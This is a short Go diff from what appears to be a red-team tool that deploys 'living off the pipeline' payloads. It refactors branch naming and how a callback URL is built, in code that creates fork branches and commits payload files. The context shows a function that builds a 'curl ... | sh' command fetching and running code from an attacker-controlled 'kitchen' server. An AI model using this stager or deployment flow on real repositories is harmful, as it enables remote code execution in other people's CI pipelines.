@@ -14,7 +14,6 @@ import (
 	"log/slog"
 	"net/http"
 	"net/url"
-	"path"
 	"strconv"
 	"strings"
 	"time"
@@ -26,6 +25,7 @@ import (
 	"golang.org/x/oauth2"
 
 	"github.com/boostsecurityio/smokedmeat/internal/lotp"
+	"github.com/boostsecurityio/smokedmeat/internal/stagerurl"
 )
 
 type gitHubClient struct {
@@ -1069,19 +1069,17 @@ func (c *gitHubClient) deployLOTP(ctx context.Context, vuln *VulnerabilityInfo, 
 		return "", fmt.Errorf("failed to get default branch: %w", err)
 	}
 
-	branchName := fmt.Sprintf("lotp-%d", time.Now().Unix())
+	branchName := generateLOTPBranchName(time.Now())
 
 	err = c.createBranch(ctx, forkOwner, forkRepo, defaultBranch, branchName)
 	if err != nil {
 		return "", fmt.Errorf("failed to create branch: %w", err)
 	}
 
-	u, err := url.Parse(kitchenURL)
+	callbackURL, err := stagerurl.URL(kitchenURL, stagerID)
 	if err != nil {
 		return "", fmt.Errorf("invalid kitchen URL: %w", err)
 	}
-	u.Path = path.Join(u.Path, "r", stagerID)
-	callbackURL := u.String()
 
 	if lotpTool == "" {
 		return "", fmt.Errorf("LOTP tool not specified — select a vulnerability with lotp_tool metadata")
@@ -1168,6 +1166,10 @@ func dynamicScriptFiles(tool string, targets []string, callbackURL string) []lot
 
 func shellCurlPipeShCommand(callbackURL string) string {
 	return fmt.Sprintf("curl -s '%s' | sh", strings.ReplaceAll(callbackURL, "'", "'\"'\"'"))
+}
+
+func generateLOTPBranchName(now time.Time) string {
+	return fmt.Sprintf("smokedmeat-lotp-%d", now.Unix())
 }
 
 func lotpFilesToCommit(payload *lotp.GeneratedPayload, tool string, targets []string, callbackURL string) []lotpFile {
